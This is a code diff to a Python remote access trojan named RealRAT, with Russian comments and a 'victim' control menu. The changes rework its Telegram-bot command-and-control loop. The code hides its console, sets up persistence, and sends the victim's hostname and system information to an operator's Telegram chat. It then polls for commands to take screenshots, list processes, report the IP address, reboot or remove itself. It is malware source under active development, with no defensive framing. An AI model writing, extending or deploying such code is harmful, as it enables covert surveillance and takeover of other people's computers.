@@ -25,7 +25,7 @@ class RealRAT:
         self.bot_token = BOT_TOKEN
         self.chat_id = CHAT_ID
         self.victim_id = socket.gethostname()
-        self.last_update_id = 0  # Запоминаем последнее обработанное сообщение
+        self.last_update_id = 0
         
     def hide_console(self):
         try:
@@ -84,20 +84,18 @@ class RealRAT:
                     [{'text': '🌐 IP адрес'}, {'text': '📊 Процессы'}],
                     [{'text': '🔄 Перезагрузить'}, {'text': '🗑️ Удалить RAT'}]
                 ],
-                'resize_keyboard': True
+                'resize_keyboard': True,
+                'one_time_keyboard': False
             }
             params = {
                 'chat_id': self.chat_id,
                 'text': f'🎯 Управление жертвой: {self.victim_id}\nВыберите действие:',
                 'reply_markup': keyboard
             }
-            response = requests.get(url, params=params, timeout=10)
-            if response.status_code == 200:
-                data = response.json()
-                if 'result' in data:
-                    self.last_update_id = data['result']['update_id']  # Запоминаем ID клавиатуры
-        except:
-            pass
+            response = requests.post(url, json=params, timeout=10)
+            print("Клавиатура отправлена") if response.status_code == 200 else print("Ошибка клавиатуры")
+        except Exception as e:
+            print(f"Ошибка отправки клавиатуры: {e}")
 
     def collect_system_info(self):
         try:
@@ -189,8 +187,8 @@ class RealRAT:
         """Проверяем только НОВЫЕ команды от бота"""
         try:
             url = f"https://api.telegram.org/bot{self.bot_token}/getUpdates"
-            params = {'offset': self.last_update_id + 1}  # Только сообщения после последнего обработанного
-            response = requests.get(url, params=params, timeout=10)
+            params = {'offset': self.last_update_id + 1, 'timeout': 10}
+            response = requests.get(url, params=params, timeout=15)
             
             if response.status_code == 200:
                 data = response.json()
@@ -206,6 +204,11 @@ class RealRAT:
                         if 'message' in update and 'text' in update['message']:
                             message_text = update['message']['text']
                             
+                            # Обрабатываем команду /start или /menu
+                            if message_text in ['/start', '/menu', 'меню', 'кнопки']:
+                                self.send_keyboard()
+                                continue
+                            
                             # Обрабатываем команды с кнопок
                             if message_text in ['📸 Скриншот', '💻 Информация', '🌐 IP адрес', '📊 Процессы', 
                                               '🔄 Перезагрузить', '🗑️ Удалить RAT']:
@@ -217,39 +220,30 @@ class RealRAT:
                                     time.sleep(2)
                                     sys.exit(0)
                             
-        except:
-            pass
+        except Exception as e:
+            print(f"Ошибка проверки команд: {e}")
 
     def start(self):
         self.hide_console()
         self.setup_persistence()
         
-        # Получаем текущие обновления чтобы игнорировать старые сообщения
-        try:
-            url = f"https://api.telegram.org/bot{self.bot_token}/getUpdates"
-            response = requests.get(url, timeout=10)
-            if response.status_code == 200:
-                data = response.json()
-                if 'result' in data and data['result']:
-                    # Устанавливаем последнее ID чтобы игнорировать старые сообщения
-                    self.last_update_id = data['result'][-1]['update_id']
-        except:
-            pass
-        
-        # Отправляем уведомление и клавиатуру
-        time.sleep(10)
-        system_info = self.collect_system_info()
-        self.send_to_telegram(system_info)
+        # Сразу отправляем клавиатуру при запуске
+        time.sleep(5)
         self.send_keyboard()
         
-        # Основной цикл - проверяем только новые команды
+        # Отправляем информацию о системе
+        time.sleep(3)
+        system_info = self.collect_system_info()
+        self.send_to_telegram(system_info)
+        
+        # Основной цикл
         while True:
             try:
                 self.check_commands()
-                time.sleep(3)  # Проверяем чаще
-            except:
+                time.sleep(3)
+            except Exception as e:
+                print(f"Ошибка главного цикла: {e}")
                 time.sleep(10)
-                continue
 
 if __name__ == '__main__':
     rat = RealRAT()
